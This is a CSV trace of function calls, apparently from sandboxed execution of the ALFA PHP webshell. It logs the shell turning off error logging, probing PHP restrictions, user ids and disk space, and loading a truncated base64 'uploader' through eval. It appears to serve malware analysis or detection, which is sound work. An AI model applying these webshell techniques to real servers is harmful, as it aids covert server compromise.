"uuid","file_md5","index","source","target","argc","argv","return","dynamic"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","33","eval","md5","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php""]]}","{""value"": ""40fe715eef53411869d47c8eb3556e1f""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","34","eval","define","2","{""value"": [[0, ""constant_name"", ""__ALFA_MD5NAME__""], [1, ""value"", ""40fe715eef53411869d47c8eb3556e1f""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","34","eval","define","2","{""value"": [[0, ""constant_name"", ""__ALFA_MD5NAME__""], [1, ""value"", ""266b4469df1ee490013cb5ff4959ab99""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","35","eval","define","2","{""value"": [[0, ""constant_name"", ""__ALFA_VERSION__""], [1, ""value"", ""3.0.2""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","36","eval","define","2","{""value"": [[0, ""constant_name"", ""__LAST_CWD__""], [1, ""value"", ""last_cwd_266b4469df1ee490013cb5ff4959ab99""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","36","eval","define","2","{""value"": [[0, ""constant_name"", ""__LAST_CWD__""], [1, ""value"", ""last_cwd_40fe715eef53411869d47c8eb3556e1f""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","37","eval","define","2","{""value"": [[0, ""constant_name"", ""__PATH_HISTORY__""], [1, ""value"", ""path_history_266b4469df1ee490013cb5ff4959ab99""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","37","eval","define","2","{""value"": [[0, ""constant_name"", ""__PATH_HISTORY__""], [1, ""value"", ""path_history_40fe715eef53411869d47c8eb3556e1f""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","38","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","39","eval","define","2","{""value"": [[0, ""constant_name"", ""__ALFA_POST_ENCRYPTION__""], [1, ""value"", true]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","40","eval","preg_replace","3","{""value"": [[0, ""regex"", ""!\(\d+\)\s.*!""], [1, ""replace"", """"], [2, ""subject"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php(10) : runtime-created function(1) ""]]}","{""value"": ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","40","eval","preg_replace","3","{""value"": [[0, ""regex"", ""!\(\d+\)\s.*!""], [1, ""replace"", """"], [2, ""subject"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php(10) : runtime-created function(1) ""]]}","{""value"": ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","41","eval","trim","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php""]]}","{""value"": ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","41","eval","trim","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php""]]}","{""value"": ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","42","eval","str_replace","3","{""value"": [[0, ""search"", ""\""], [1, ""replace"", ""/""], [2, ""subject"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php""]]}","{""value"": ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_643c5f0e-0307-11eb-b91f-00163e142113.php""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","42","eval","str_replace","3","{""value"": [[0, ""search"", ""\""], [1, ""replace"", ""/""], [2, ""subject"", ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php""]]}","{""value"": ""/usr/share/nginx/html/3e0ae99fd9b6c7c157e6c64560bfcf16_b7052d37-e461-403f-b037-607463a4dc70.php""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","43","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","44","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","45","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","46","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","47","eval","session_start","0","{""value"": []}","{""value"": ""void""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","48","eval","error_reporting","1","{""value"": [[0, ""new_error_level"", 32759]]}","{""value"": ""void""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","49","eval","ini_set","2","{""value"": [[0, ""varname"", ""error_log""], [1, ""newvalue"", null]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","50","eval","ini_set","2","{""value"": [[0, ""varname"", ""log_errors""], [1, ""newvalue"", 0]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","51","eval","ini_set","2","{""value"": [[0, ""varname"", ""max_execution_time""], [1, ""newvalue"", 0]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","52","eval","ini_set","2","{""value"": [[0, ""varname"", ""magic_quotes_runtime""], [1, ""newvalue"", 0]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","53","eval","set_time_limit","1","{""value"": [[0, ""seconds"", 0]]}","{""value"": ""void""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","54","eval","function_exists","1","{""value"": [[0, ""function_name"", ""set_magic_quotes_runtime""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","55","eval","set_magic_quotes_runtime","1","{""value"": [[0, ""new_setting"", 0]]}","{""value"": ""void""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","56","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","57","eval","substr","3","{""value"": [[0, ""str"", ""Linux""], [1, ""start"", 0], [2, ""length"", 3]]}","{""value"": ""Lin""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","58","eval","strtolower","1","{""value"": [[0, ""str"", ""Lin""]]}","{""value"": ""lin""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","59","eval","getcwd","0","{""value"": []}","{""value"": ""/usr/share/nginx/html""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","60","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","61","eval","zend_fetch_r_session","1","{""value"": [[0, ""op1"", ""_SESSION""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","62","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","63","eval","getcwd","0","{""value"": []}","{""value"": ""/usr/share/nginx/html""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","64","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","65","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","66","eval","strlen","1","{""value"": [[0, ""str"", ""/usr/share/nginx/html""]]}","{""value"": 21}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","67","eval","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","68","eval","function_exists","1","{""value"": [[0, ""function_name"", ""posix_getpwuid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","69","eval","function_exists","1","{""value"": [[0, ""function_name"", ""posix_getgrgid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","70","eval","function_exists","1","{""value"": [[0, ""function_name"", ""scandir""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","71","eval","function_exists","1","{""value"": [[0, ""function_name"", ""alfaFilesMan""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","72","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","73","eval","function_exists","1","{""value"": [[0, ""function_name"", ""alfaFilesMan""]]}","{""value"": true}","[130]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","74","eval","zend_fetch_r_post","1","{""value"": [[0, ""op1"", ""_POST""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","75","eval","call_user_func","1","{""value"": [[0, ""function_name"", ""alfaFilesMan""]]}","{""value"": ""void""}","[130]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","76","call_user_func","alfahead","0","{""value"": []}","{""value"": ""void""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","77","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""sys_get_temp_dir""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","78","alfahead","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","79","alfahead","__zw5jb2rlcg","1","{""value"": [[0, ""s"", ""$x = base64_decode(""PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW""]]}","{""value"": ""JHggPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ1pXTm9ieUFpUEhScGRHeGxQbE52YkdWMmFYTnBZbXhsSUZWd2JHOWhaR1Z5UEM5MGFYUnNaVDVjYmp4aWIyUjVJR0puWT""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","80","__zw5jb2rlcg","juwzljyoeq","1","{""value"": [[0, ""s"", ""$x = base64_decode(""PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW""]]}","{""value"": ""JHggPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ1pXTm9ieUFpUEhScGRHeGxQbE52YkdWMmFYTnBZbXhsSUZWd2JHOWhaR1Z5UEM5MGFYUnNaVDVjYmp4aWIyUjVJR0puWT""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","81","juwzljyoeq","base64_encode","1","{""value"": [[0, ""str"", ""$x = base64_decode(""PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW""]]}","{""value"": ""JHggPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ1pXTm9ieUFpUEhScGRHeGxQbE52YkdWMmFYTnBZbXhsSUZWd2JHOWhaR1Z5UEM5MGFYUnNaVDVjYmp4aWIyUjVJR0puWT""}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","82","alfahead","define","2","{""value"": [[0, ""constant_name"", ""ALFA_UPLOADER""], [1, ""value"", ""eval(base64_decode('JHggPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ1pXTm9ieUFpUEhScGRHeGxQbE52YkdWMmFYTnBZbXhsSUZWd2JHOWhaR1Z5UEM5MGFYUnNaVD""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","83","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""sys_get_temp_dir""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","84","alfahead","sys_get_temp_dir","0","{""value"": []}","{""value"": ""/tmp""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","85","alfahead","str_replace","3","{""value"": [[0, ""search"", ""\""], [1, ""replace"", ""/""], [2, ""subject"", ""/tmp""]]}","{""value"": ""/tmp""}","[0, 0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","86","alfahead","is_writable","1","{""value"": [[0, ""filename"", ""/tmp""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","87","alfahead","sys_get_temp_dir","0","{""value"": []}","{""value"": ""/tmp""}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","88","alfahead","define","2","{""value"": [[0, ""constant_name"", ""ALFA_TEMPDIR""], [1, ""value"", ""/tmp""]]}","{""value"": ""void""}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","89","alfahead","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","90","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""diskfreespace""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","91","alfahead","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","92","alfahead","diskfreespace","1","{""value"": [[0, ""path"", ""/usr/share/nginx/html/""]]}","{""value"": 75237720064}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","92","alfahead","diskfreespace","1","{""value"": [[0, ""path"", ""/usr/share/nginx/html/""]]}","{""value"": 74514665472}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","93","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""disk_total_space""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","94","alfahead","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","95","alfahead","disk_total_space","1","{""value"": [[0, ""path"", ""/usr/share/nginx/html/""]]}","{""value"": 84413566976}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","96","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""ssh2_connect""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","97","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""curl_version""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","98","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""mysql_get_client_info""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","99","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""mssql_connect""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","100","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""pg_connect""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","101","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""oci_connect""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","102","alfahead","ini_get","1","{""value"": [[0, ""varname"", ""disable_functions""]]}","{""value"": """"}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","103","alfahead","ini_get","1","{""value"": [[0, ""varname"", ""safe_mode""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","104","alfahead","ini_get","1","{""value"": [[0, ""varname"", ""open_basedir""]]}","{""value"": """"}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","105","alfahead","ini_get","1","{""value"": [[0, ""varname"", ""safe_mode_exec_dir""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","106","alfahead","ini_get","1","{""value"": [[0, ""varname"", ""safe_mode_include_dir""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","107","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""posix_getegid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","108","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""posix_getpwuid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","109","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""posix_geteuid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","110","alfahead","posix_geteuid","0","{""value"": []}","{""value"": 1000}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","111","alfahead","posix_getpwuid","1","{""value"": [[0, ""uid"", 1000]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","112","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""posix_getgrgid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","113","alfahead","function_exists","1","{""value"": [[0, ""function_name"", ""posix_getegid""]]}","{""value"": true}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","114","alfahead","posix_getegid","0","{""value"": []}","{""value"": 1000}","[]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","115","alfahead","posix_getgrgid","1","{""value"": [[0, ""gid"", 1000]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","116","alfahead","zend_fetch_r_globals","1","{""value"": [[0, ""op1"", ""GLOBALS""]]}","{""value"": []}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","117","alfahead","explode","2","{""value"": [[0, ""separator"", ""/""], [1, ""str"", ""/usr/share/nginx/html/""]]}","{""value"": []}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","118","alfahead","count","1","{""value"": [[0, ""var"", []]]}","{""value"": 6}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","119","alfahead","range","2","{""value"": [[0, ""low"", ""a""], [1, ""high"", ""z""]]}","{""value"": []}","[0, 0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","120","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""a:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","121","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""b:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","122","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""c:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","123","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""d:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","124","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""e:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","125","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""f:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","126","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""g:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","127","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""h:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","128","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""i:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","129","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""j:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","130","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""k:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","131","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""l:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","132","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""m:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","133","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""n:\""]]}","{""value"": false}","[0]"
"7aeb0f45e12e6efbf55147e587f2eda5","3e0ae99fd9b6c7c157e6c64560bfcf16","134","alfahead","is_dir","1","{""value"": [[0, ""filename"", ""o:\""]]}","{""value"": false}","[0]"
